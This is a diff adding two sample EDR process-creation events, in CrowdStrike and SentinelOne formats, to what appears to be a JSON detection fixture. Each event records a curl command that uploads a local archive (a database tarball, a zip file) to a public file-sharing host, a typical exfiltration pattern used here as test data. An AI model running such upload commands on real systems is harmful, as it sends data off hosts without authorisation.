@@ -54,5 +54,46 @@
       "InitiatingProcessFileName": "cmd.exe",
       "AccountName": "svc-backup"
     }
+  },
+  {
+    "_source": "crowdstrike_fdr",
+    "event_simpleName": "ProcessRollup2",
+    "aid": "0123456789abcdef0123456789abcdef",
+    "cid": "fedcba9876543210fedcba9876543210",
+    "event_platform": "Lin",
+    "ImageFileName": "/usr/bin/curl",
+    "CommandLine": "curl -F file=@/tmp/db.tar.gz https://0x0.st",
+    "ParentBaseFileName": "bash",
+    "RawProcessId": "4270",
+    "UserName": "deploy"
+  },
+  {
+    "_source": "sentinelone_cloudfunnel",
+    "event": {
+      "category": "process",
+      "type": "Process Creation"
+    },
+    "agent": {
+      "uuid": "11112222333344445555666677778888"
+    },
+    "endpoint": {
+      "name": "host10.example.com",
+      "os": "windows"
+    },
+    "tgt": {
+      "process": {
+        "name": "curl.exe",
+        "cmdline": "curl.exe --upload-file C:\\Users\\Public\\out.zip https://transfer.sh/out.zip",
+        "image": {
+          "path": "C:\\Windows\\System32\\curl.exe"
+        },
+        "user": "EXAMPLE\\jdoe"
+      }
+    },
+    "src": {
+      "process": {
+        "name": "cmd.exe"
+      }
+    }
   }
 ]
